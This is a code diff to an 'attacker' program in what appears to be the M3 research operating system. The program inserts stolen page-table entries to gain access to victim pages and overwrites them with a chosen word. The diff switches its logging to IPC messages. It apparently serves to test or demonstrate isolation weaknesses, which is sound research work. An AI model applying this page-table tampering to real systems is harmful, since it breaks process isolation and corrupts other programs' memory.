@@ -18,23 +18,31 @@
 use core::mem::size_of;
 use core::ptr::write_volatile;
 
+use m3::cap::Selector;
 use m3::client::MapFlags;
+use m3::com::SendGate;
 use m3::env;
 use m3::errors::Error;
 use m3::kif::Perm;
 use m3::mem::VirtAddr;
-use m3::println;
 use m3::tiles::Activity;
+use m3::vec::Vec;
 use m3::{cfg, tmif};
+
+macro_rules! ipc_print {
+    ($sgate:expr, $fmt:expr, $($arg:tt)*) => {
+        let msg = m3::format!(concat!("!! attacker: ", $fmt), $($arg)*);
+        m3::send_recv!($sgate, m3::com::RecvGate::def(), msg).unwrap();
+    };
+}
 
 #[no_mangle]
 pub fn main() -> Result<(), Error> {
-    let word = if let Some(arg) = env::args().nth(1) {
-        arg
-    }
-    else {
-        "HACKED!"
-    };
+    let args = env::args().collect::<Vec<_>>();
+    let word = args[1];
+
+    let sgate_sel: Selector = args[2].parse().expect("Unable to parse selector");
+    let sgate = SendGate::new_bind(sgate_sel);
 
     let virt = VirtAddr::from(0x3000_0000);
     Activity::own()
@@ -53,9 +61,11 @@ pub fn main() -> Result<(), Error> {
         let page_table = VirtAddr::from(*virt.as_ptr::<u64>().offset(1) as usize);
 
         assert!(count <= 4);
-        println!(
-            "!! attacker found {} victims, using page_table {}",
-            count, page_table
+        ipc_print!(
+            sgate,
+            "found {} victims, using page_table {}",
+            count,
+            page_table
         );
 
         // start with fourth page, because the pager faults in 4 pages at once
@@ -63,22 +73,19 @@ pub fn main() -> Result<(), Error> {
 
         for i in 0..count {
             let pte = *virt.as_ptr::<u64>().offset(2 + i);
-            println!(
-                "!! attacker: getting access to victim {} (pte={:#x})",
-                i, pte
-            );
+            ipc_print!(sgate, "getting access to victim {} (pte={:#x})", i, pte);
 
             let pte_addr =
                 VirtAddr::from(page_table + (start_page + i) as usize * size_of::<u64>());
             // insert PTE to access victim page
             write_volatile(pte_addr.as_mut_ptr(), pte);
 
-            println!("!! attacker: overwriting with {} in victim {}", word, i);
+            ipc_print!(sgate, "overwriting with {} in victim {}", word, i);
 
             // overwrite beginning of victim page
             let page_addr = virt + (start_page + i) as usize * cfg::PAGE_SIZE;
             core::ptr::copy_nonoverlapping(word.as_ptr(), page_addr.as_mut_ptr(), word.len());
-            println!("!! attacker: done with victim {}!", i);
+            ipc_print!(sgate, "done with victim {}!", i);
         }
     }
 
